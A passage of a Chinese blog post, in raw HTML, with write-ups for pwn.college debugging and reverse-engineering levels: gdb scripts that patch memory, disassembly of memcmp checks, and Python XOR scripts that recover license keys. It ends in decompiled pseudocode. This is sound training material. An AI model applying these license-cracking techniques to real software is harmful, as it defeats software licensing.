class="line">0x0000000000001d20 &lt;+634&gt;:   mov    rsi,rax</span><br><span class="line">0x0000000000001d23 &lt;+637&gt;:   lea    rdi,[rip+0xbea]        # 0x2914</span><br><span class="line">0x0000000000001d2a &lt;+644&gt;:   mov    eax,0x0</span><br></pre></td></tr></tbody></table></figure><p>由上述代码可知，<code>read</code>系统调用的缓冲区地址为<code>[rbp-0x18]</code>，然后<code>scanf</code>函数获取用户输入，只需将用户输入<code>[rbp-0x10]</code>地址处的内容修改为<code>[rbp-0x18]</code>地址处的内容即可，完整脚本如下，运行后输入一次任意字符，回车后即可得到flag</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line">break *main+577</span><br><span class="line">commands</span><br><span class="line">  silent</span><br><span class="line">  p/x $rsi</span><br><span class="line">  continue</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">break *main+637</span><br><span class="line">commands</span><br><span class="line">  silent</span><br><span class="line">  # 涉及的是内存内容的操作</span><br><span class="line">  set *((uint64_t *) ($rbp-0x10)) = *((uint64_t *)($rbp-0x18))</span><br><span class="line">  continue</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">continue</span><br></pre></td></tr></tbody></table></figure></li><li><p>Debugging Refresher-level7：提升权限的 GDB 实例。</p><p>wp：运行关卡文件，<code>run</code>运行程序，根据提示使用<code>call (void)win()</code>然后到得到flag</p></li><li><p>DebuggingRefresher-level8：无法直接使用<code>call (void)win()</code>得到flag</p><p>wp：题目没给提示，没有一点思路，参考大佬的<a href="https://tech.c01dkit.com/pwn-college-cse365-spring2023/#reverse-engineering-writeups">wp</a></p><blockquote><p><code>SIGSEGV</code> 是指操作系统发送给进程的一种信号，全称为"SegmentationViolation"（段错误）。它是一种常见的程序运行时错误，通常发生在以下几种情况下：</p><ol type="1"><li><strong>空指针解引用</strong>：试图读取或写入空指针所指向的内存位置。</li><li><strong>访问未分配的内存</strong>：试图访问未被操作系统分配的内存区域，比如访问超出了进程内存空间范围的地址。</li><li><strong>只读内存访问</strong>：试图写入只读内存区域。</li><li><strong>内存访问越界</strong>：试图访问数组或者其他数据结构的时候，超出了其分配的内存范围。</li><li><strong>栈溢出</strong>：栈区内存溢出，超出了当前栈的容量</li></ol><p>在大多数操作系统中，尝试在地址 <code>0x0</code>处进行读取操作会导致一个 <code>SIGSEGV</code>信号，即空指针异常。这是因为操作系统通常会将地址 <code>0x0</code>保留为未分配的内存，访问这些地址会导致程序崩溃。</p></blockquote></li><li><p>level1.0：找到正确的注册码</p><p>wp：运行<code>/challenge/</code>文件夹下的文件，任意输入几个字符得到回显</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Expected result:</span><br><span class="line"></span><br><span class="line">        64 66 6c 78 6d</span><br></pre></td></tr></tbody></table></figure><p>将上述十六进制转为ASCii码，得到<code>dflxm</code>，再次运行目标文件，输入字符串，得到flag</p></li><li><p>level1.1：要求同上一关，但是没有回显提示正确字符串</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) bt：显示当前线程的调用栈（backtrace），包括每一帧的调用函数、文件名、行号以及参数等信息</span><br><span class="line">(gdb) info stack：命令也显示当前线程的调用栈，但它有更多选项，可以更灵活地控制输出格式和内容</span><br></pre></td></tr></tbody></table></figure><p>wp：首先尝试直接运行，但是发现不回显正确字符串，于是使用gdb进行调试，但是<code>disas main</code>无法查看汇编指令，对<code>main</code>下断点也失败。尝试使用<code>objdump -M intel -d /challenge/babyrev_level1.1 &gt; level1_1</code>反汇编目标文件并将汇编代码保存到<code>level1_1</code>中，大致浏览一下代码看看重要函数，发现<code>memcmp</code>函数，下面是该函数的分析</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">memcmp</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *s1, <span class="type">const</span> <span class="type">void</span> *s2, <span class="type">size_t</span> n)</span>;</span><br><span class="line">- s1：指向第一个内存块的指针。</span><br><span class="line">- s2：指向第二个内存块的指针。</span><br><span class="line">- n：要比较的字节数。</span><br></pre></td></tr></tbody></table></figure><p>反汇编得到的代码中没有真实地址，需要运行才能得到，参考大佬的<a href="https://tech.c01dkit.com/pwn-college-cse365-spring2023/#reverse-engineering-writeups">wp</a>，首先通过gdb运行程序在输入环节直接截停(ctrl+c)程序，然后通过<code>bt</code>命令查看函数调用栈，得到：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">0  0x00007fb965acf1f2 <span class="keyword">in</span> __GI___libc_read (fd=0, buf=0x7ffe3d7e8e92, nbytes=5)</span></span><br><span class="line">    at ../sysdeps/unix/sysv/linux/read.c:26</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1  0x000055b29983a535 <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2  0x00007fb9659e5083 <span class="keyword">in</span> __libc_start_main (main=0x55b29983a412, argc=1, argv=0x7ffe3d7e8f98,</span></span><br><span class="line">    init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7ffe3d7e8f88)</span><br><span class="line">    at ../csu/libc-start.c:308</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3  0x000055b29983a22e <span class="keyword">in</span> ?? ()</span></span><br></pre></td></tr></tbody></table></figure><p>然后使用<code>x/80i 0x55b29983a412</code>查看<code>main</code>的内容，找到<code>memcmp</code>函数：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x55b29983a541:      lea    rax,[rbp-0xe]</span><br><span class="line">0x55b29983a545:      mov    edx,0x5</span><br><span class="line">0x55b29983a54a:      lea    rsi,[rip+0x2abf]        # 0x55b29983d010</span><br><span class="line">0x55b29983a551:      mov    rdi,rax</span><br><span class="line">0x55b29983a554:      call   0x55b29983a1b0 &lt;memcmp@plt&gt;</span><br></pre></td></tr></tbody></table></figure></li></ul><p><code>rsi</code>中存放的就是flag的地址即注释中的地址，使用<code>x/5c 0x55b29983d010</code>得到正确字符串：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x55b29983d010: 104 'h' 103 'g' 115 's' 97 'a'  97 'a'</span><br></pre></td></tr></tbody></table></figure><p>然后退出gdb重新运行程序，输入正确字符串，得到flag</p><ul><li><p>level2.0：字符串比较前被修改过。</p><p>wp：首先根据回显得到目标字符串<code>zdniz</code>，但是输入该字符串无法得到flag，于是使用gdb调试，在<code>memcmp</code>处下断点，然后运行至该处，查看被比较的两个字符串，发现我输入的字符串中第三个和第四个字符顺序对调了，所以在输入时将这两个字符顺序对调即可得到flag</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/5c $rdi</span><br><span class="line">0x7ffda4747842: 122 'z' 100 'd' 105 'i' 110 'n' 122 'z'</span><br><span class="line">(gdb) x/5c $rsi</span><br><span class="line">0x5605e890c010 &lt;EXPECTED_RESULT&gt;:       122 'z' 100 'd' 110 'n' 105 'i' 122 'z'</span><br></pre></td></tr></tbody></table></figure></li><li><p>level2.1：思路同1.1</p><p>wp：运行程序不回显正确字符串，运行gdb无法使用<code>disas main</code>，所以使用1.1的思路，首先在gdb中<code>run</code>，然后不输入字符串直接<code>ctrl+c</code>停止运行，使用<code>bt</code>查看栈中函数：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">0  0x00007fc3682811f2 <span class="keyword">in</span> <span class="built_in">read</span> () from /lib/x86_64-linux-gnu/libc.so.6</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1  0x000055fafae44535 <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2  0x00007fc368197083 <span class="keyword">in</span> __libc_start_main () from /lib/x86_64-linux-gnu/libc.so.6</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3  0x000055fafae4422e <span class="keyword">in</span> ?? ()</span></span><br></pre></td></tr></tbody></table></figure><p>首先查看<code>__libc_start_main</code>函数，没发现特殊函数，也没显示参数。然后我就在这卡住了，于是尝试<code>x/15i 0x000055fafae44535</code>（<code>read</code>函数下面的<code>??</code>函数），发现<code>memcmp</code>函数：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x55fafae44535:      movzx  eax,BYTE PTR [rbp-0xd]</span><br><span class="line">0x55fafae44539:      mov    BYTE PTR [rbp-0x10],al</span><br><span class="line">0x55fafae4453c:      movzx  eax,BYTE PTR [rbp-0xb]</span><br><span class="line">0x55fafae44540:      mov    BYTE PTR [rbp-0xf],al</span><br><span class="line">0x55fafae44543:      movzx  eax,BYTE PTR [rbp-0xf]</span><br><span class="line">0x55fafae44547:      mov    BYTE PTR [rbp-0xd],al</span><br><span class="line">0x55fafae4454a:      movzx  eax,BYTE PTR [rbp-0x10]</span><br><span class="line">0x55fafae4454e:      mov    BYTE PTR [rbp-0xb],al</span><br><span class="line">0x55fafae44551:      lea    rdi,[rip+0xdb0]        # 0x55fafae45308</span><br><span class="line">0x55fafae44558:      call   0x55fafae44140 &lt;puts@plt&gt;</span><br><span class="line">0x55fafae4455d:      lea    rax,[rbp-0xe]</span><br><span class="line">0x55fafae44561:      mov    edx,0x5</span><br><span class="line">0x55fafae44566:      lea    rsi,[rip+0x2aa3]        # 0x55fafae47010</span><br><span class="line">0x55fafae4456d:      mov    rdi,rax</span><br><span class="line">0x55fafae44570:      call   0x55fafae441b0 &lt;memcmp@plt&gt;</span><br></pre></td></tr></tbody></table></figure><p>接着设置断点，查看相关寄存器或内存的内容，详细步骤如下：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b *0x55fafae44570</span><br><span class="line">Breakpoint 1 at 0x55fafae44570</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">zalf    # 注意这里我只输入了4个字符，因为回车也算一个字符，若输入5个字符则会跳过断点</span><br><span class="line">Checking the received license key!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x000055fafae44570 in ?? ()</span><br><span class="line">(gdb) x/5c 0x55fafae47010</span><br><span class="line">0x55fafae47010: 122 'z' 97 'a'  108 'l' 102 'f' 109 'm'</span><br><span class="line">(gdb) x/5c $rbp-0xe</span><br><span class="line">0x7fff3386c952: 122 'z' 102 'f' 108 'l' 97 'a'  10 '\n'</span><br></pre></td></tr></tbody></table></figure><p>得到目标字符串<code>zalfm</code>，发现我输入的字符串中第二个和第四个字符顺序对调，退出gdb，重新运行目标程序，输入字符串<code>zflam</code>，回车得到flag</p></li><li><p>level3.0：思路同2.0</p><p>wp：逆序输入字符串</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/5c 0x55f839045010</span><br><span class="line">0x55f839045010 &lt;EXPECTED_RESULT&gt;: 109 'm' 111 'o' 114 'r' 106 'j' 116 't'</span><br><span class="line">(gdb) x/5c $rbp-0xe</span><br><span class="line">0x7fff5d8dea92: 116 't' 106 'j' 114 'r' 111 'o' 109 'm'</span><br></pre></td></tr></tbody></table></figure></li><li><p>level3.1：同2.1</p></li><li><p>level4.0：同2.0，没发现字符串被修改了</p></li><li><p>level4.1：同2.1，按照ASCii码表的顺序修改？</p></li><li><p>level5.0：运行目标程序，任意输入五个字符，得到提示</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This challenge is now mangling your input using the `xor` mangler with key `0x64`</span><br></pre></td></tr></tbody></table></figure><p>wp：只需要将目标十六进制与<code>0x64</code>进行异或即可得到正确字符串</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">0x0b</span>, <span class="number">0x0e</span>, <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x12</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s)):</span><br><span class="line">s[i] = <span class="built_in">chr</span>(s[i] ^ <span class="number">0x64</span>)</span><br><span class="line"><span class="built_in">print</span>(s)  <span class="comment"># ojsvv</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>level5.1：同5.0</p><p>wp：步骤同2.1，先找到正确的字符串，得到下面的结果，并不是常见的ASCii码</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 使用 x/5c 0x5582accad010</span><br><span class="line">0x55c7c5bfa010: -80 '\260'  -93 '\243'  -93 '\243'  -88 '\250'  -91 '\245'</span><br><span class="line"># 十进制（有符号整数）：负数值</span><br><span class="line"># 字符表示：对应的 ASCII 字符，用八进制表示（\xxx）</span><br><span class="line"></span><br><span class="line"># 或者使用 x/5bx 0x5582accad010 得到下面结果</span><br><span class="line">0x5582accad010: 0xb0    0xa3    0xa3    0xa8    0xa5</span><br></pre></td></tr></tbody></table></figure><p>然后按照之前的步骤，找到关键代码：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0x55c7c5bf7535:      mov    DWORD PTR [rbp-0x14],0x0</span><br><span class="line">0x55c7c5bf753c:      jmp    0x55c7c5bf755b</span><br><span class="line">0x55c7c5bf753e:      mov    eax,DWORD PTR [rbp-0x14]</span><br><span class="line">0x55c7c5bf7541:      cdqe</span><br><span class="line">0x55c7c5bf7543:      movzx  eax,BYTE PTR [rbp+rax*1-0xe]</span><br><span class="line">0x55c7c5bf7548:      xor    eax,0xffffffd1</span><br><span class="line">0x55c7c5bf754b:      mov    edx,eax</span><br><span class="line">0x55c7c5bf754d:      mov    eax,DWORD PTR [rbp-0x14]</span><br><span class="line">0x55c7c5bf7550:      cdqe</span><br><span class="line">0x55c7c5bf7552:      mov    BYTE PTR [rbp+rax*1-0xe],dl</span><br><span class="line">0x55c7c5bf7556:      nop</span><br><span class="line">0x55c7c5bf7557:      add    DWORD PTR [rbp-0x14],0x1</span><br><span class="line">0x55c7c5bf755b:      cmp    DWORD PTR [rbp-0x14],0x4</span><br><span class="line">0x55c7c5bf755f:      jle    0x55c7c5bf753e</span><br><span class="line">0x55c7c5bf7561:      lea    rdi,[rip+0xda0]        # 0x55c7c5bf8308</span><br><span class="line">0x55c7c5bf7568:      call   0x55c7c5bf7140 &lt;puts@plt&gt;</span><br><span class="line">0x55c7c5bf756d:      lea    rax,[rbp-0xe]</span><br><span class="line">0x55c7c5bf7571:      mov    edx,0x5</span><br><span class="line">0x55c7c5bf7576:      lea    rsi,[rip+0x2a93]        # 0x55c7c5bfa010</span><br><span class="line">0x55c7c5bf757d:      mov    rdi,rax</span><br><span class="line">0x55c7c5bf7580:      call   0x55c7c5bf71b0 &lt;memcmp@plt&gt;</span><br></pre></td></tr></tbody></table></figure><p>分析上述代码，可知输入的每个字符都进行了异或操作，循环5次（共5个字符），参与异或的立即数是<code>0xffffffd1</code>，是32位整数，但是最终只要求8位（1字节），所以脚本如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s1 = [<span class="number">0xb0</span>, <span class="number">0xa3</span>, <span class="number">0xa3</span>, <span class="number">0xa8</span>, <span class="number">0xa5</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">s1[i] = <span class="built_in">chr</span>(s1[i] ^ <span class="number">0xffffffd1</span> &amp; <span class="number">0xff</span>)  <span class="comment"># 0xff 是为了获取低8位</span></span><br><span class="line"><span class="built_in">print</span>(s1)</span><br></pre></td></tr></tbody></table></figure><p>或者使用十进制进行计算（不推荐，涉及到负数和补码）</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = [-<span class="number">80</span>, -<span class="number">93</span>, -<span class="number">93</span>, -<span class="number">88</span>, -<span class="number">91</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s)):</span><br><span class="line">s[i] = <span class="built_in">chr</span>(s[i] ^ -<span class="number">47</span>) </span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level6.0：简单</p><p>wp：直接运行，得到目标字符串的十六进制，转换为ASCII码，再次运行，输入正确字符串得到flag</p></li><li><p>level6.1：同5.1</p><p>wp：首先找到关键代码，发现目标字符串有18个字符，剩下的步骤与5.1相同</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s1 = [<span class="number">0xcc</span>,<span class="number">0xd4</span>,<span class="number">0xd7</span>,<span class="number">0xc9</span>,<span class="number">0xd9</span>,<span class="number">0xd9</span>,<span class="number">0xd9</span>,<span class="number">0xcd</span>,<span class="number">0xcd</span>,<span class="number">0xdf</span>,<span class="number">0xd2</span>,<span class="number">0xcd</span>,<span class="number">0xd1</span>,<span class="number">0xda</span>,<span class="number">0xd9</span>,<span class="number">0xce</span>,<span class="number">0xd9</span>,<span class="number">0xd6</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">flag += <span class="built_in">chr</span>(s1[i] ^ <span class="number">0xffffffbb</span> &amp; <span class="number">0xff</span>) </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level7.0：运行目标程序，任意输入字符串，得到提示</p><p>wp：根据提示一步一步编写脚本，注意这里的异或操作，不是将每个字节与每个立即数进行异或，而是每个字节对应立即数的其中一个字节进行异或</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">s1 = [<span class="number">0x5c</span>, <span class="number">0x6d</span>, <span class="number">0xf2</span>, <span class="number">0x49</span>, <span class="number">0x94</span>, <span class="number">0x37</span>, <span class="number">0xa9</span>, <span class="number">0x5a</span>, <span class="number">0x51</span>, <span class="number">0xf1</span>, <span class="number">0xf0</span>, <span class="number">0x0f</span>, <span class="number">0x49</span>, <span class="number">0x30</span>, <span class="number">0x2f</span>, <span class="number">0x4b</span>, <span class="number">0x09</span>, <span class="number">0x2e</span>, <span class="number">0xfe</span>, <span class="number">0x97</span>, <span class="number">0x51</span>, <span class="number">0x6f</span>, <span class="number">0xf4</span>, <span class="number">0x5e</span>, <span class="number">0x9e</span>, <span class="number">0x3f</span>, <span class="number">0xa6</span>, <span class="number">0x51</span>, <span class="number">0x50</span>]</span><br><span class="line">s2 = [<span class="number">0xc68dc3ca1f</span>, <span class="number">0xc899</span>, <span class="number">0x2be19206</span>, <span class="number">0x11f1047f</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s2)):</span><br><span class="line">length = <span class="built_in">round</span>(s2[j].bit_length()/<span class="number">8</span>)  <span class="comment"># 获取字节数</span></span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">s1[i] = s1[i] ^ (s2[j] &gt;&gt; ((length-<span class="number">1</span> - i%length)*<span class="number">8</span>)) &amp; <span class="number">0xff</span></span><br><span class="line"><span class="comment">#flag += chr(s1[i] ^ 0xc68dc3ca1f ^ 0xc899 ^ 0x2be19206 ^ 0x11f1047f )</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">flag += <span class="built_in">chr</span>(s1[i])</span><br><span class="line"><span class="comment">#print(hex(s1[i]))</span></span><br><span class="line">flag = <span class="built_in">list</span>(flag)</span><br><span class="line">tmp = flag[<span class="number">2</span>]</span><br><span class="line">flag[<span class="number">2</span>] =  flag[<span class="number">12</span>]</span><br><span class="line">flag[<span class="number">12</span>] = tmp</span><br><span class="line"><span class="built_in">print</span>(<span class="string">''</span>.join(flag))</span><br></pre></td></tr></tbody></table></figure></li><li><p>level7.1：要求同上</p><p>wp：静态与动态调试相结合，首先通过之前的方法用gdb找到正确的答案</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x55c058051010: 0x40    0xf3    0x82    0xd6    0x9b    0x57    0xe2    0x98</span><br><span class="line">0x55c058051018: 0xdf    0x6f    0x5b    0xf3    0x9c    0xd6    0x7e    0x68</span><br><span class="line">0x55c058051020: 0xff    0x94    0xd0    0x68    0x52    0xfd    0x63    0xc5</span><br><span class="line">0x55c058051028: 0x52    0x4a    0xe6    0x9b    0xc3</span><br></pre></td></tr></tbody></table></figure><p>接着阅读汇编尝试理解逻辑，发现有难度，于是尝试使用<strong>IDA</strong>，找到<code>main</code>函数（通过start找到main函数），然后通过<strong>反编译</strong>（F5键）得到伪代码：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [rsp+2Ch] [rbp-44h]</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+2Eh] [rbp-42h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+30h] [rbp-40h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+32h] [rbp-3Eh]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+34h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+38h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+3Ch] [rbp-34h]</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+48h] [rbp-28h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  __int16 v14; <span class="comment">// [rsp+5Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v15; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v15 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">0</span> )</span><br><span class="line">    __assert_fail(<span class="string">"argc &gt; 0"</span>, <span class="string">"&lt;stdin&gt;"</span>, <span class="number">0x32</span>u, <span class="string">"main"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"###"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"### Welcome to %s!\n"</span>, *a2);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"###"</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">"This license verifier software will allow you to read the flag. However, before you can do so, you must verify that you"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"are licensed to read flag files! This program consumes a license key over stdin. Each program may perform entirely"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span 